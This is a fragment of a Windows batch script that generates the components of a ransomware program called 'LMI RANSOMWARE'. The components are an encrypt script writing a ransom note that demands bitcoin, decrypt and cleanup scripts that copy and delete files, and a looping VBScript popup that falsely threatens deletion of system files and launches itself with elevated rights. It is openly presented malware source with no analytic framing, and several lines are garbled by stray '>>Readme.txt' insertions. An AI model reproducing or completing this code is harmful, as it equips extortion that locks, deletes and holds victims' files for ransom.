...
echo echo ----What happened to my files?----^>"%%%%~A.LMI">>Encrypt.bat
echo echo Your personal files are all encrypted by LMI RANSOMWARE.^>^>"%%%%~A.LMI">>Encrypt.bat
echo echo You cannot access your files until you get your PERSONAL KEY.^>^>"%%%%~A.LMI">>Encrypt.bat
echo echo.^>^>"%%%%~A.LMI">>Encrypt.bat
echo echo ----How Can >>Readme.txtI get my key?----^>^>"%%%%~A.LMI">>Encrypt.bat
echo echo Pay 200 doll>>Readme.txtars worth bitcoin by the lin>>Readme.txtk, and you'll get your personal key.^>^>"%%%%~A.LMI">>Encrypt.bat
echo echo : %random%%random%@gmail.com^>^>"%%%%~A.LMI">>Encrypt.bat
...
echo xcopy %appdata%\LMI\Videos %userprofile%\Videos /e /h /y>>Decrypt.bat
...
echo for /r %%%%i in (*.LMI) do del "%%%%i">>Decrypt.bat
echo cd %appdata%\LMI>>Decrypt.bat
...
echo Rmdir /s /q LMI /S>>Regedit.bat
...
:Warning
echo do>Warning.vbs
echo msgbox "If you close this file, Your System files will be deleted.",0+16,"Warning">>Warning.vbs
echo Loop>>Warning.vbs

echo @echo off>Warning.bat
echo :a>>Warning.bat
echo start %appdata%\LMI\Warning.vbs>>Warning.bat
echo goto a>>Warning.bat

echo Set objShell = CreateObject("Shell.Application") >Warning_V.vbs
echo objShell.ShellExecute "%appdata%\LMI\Warning.bat", "/c lodctr.exe /r", "", "runas", 0 >>Warning_V.vbs
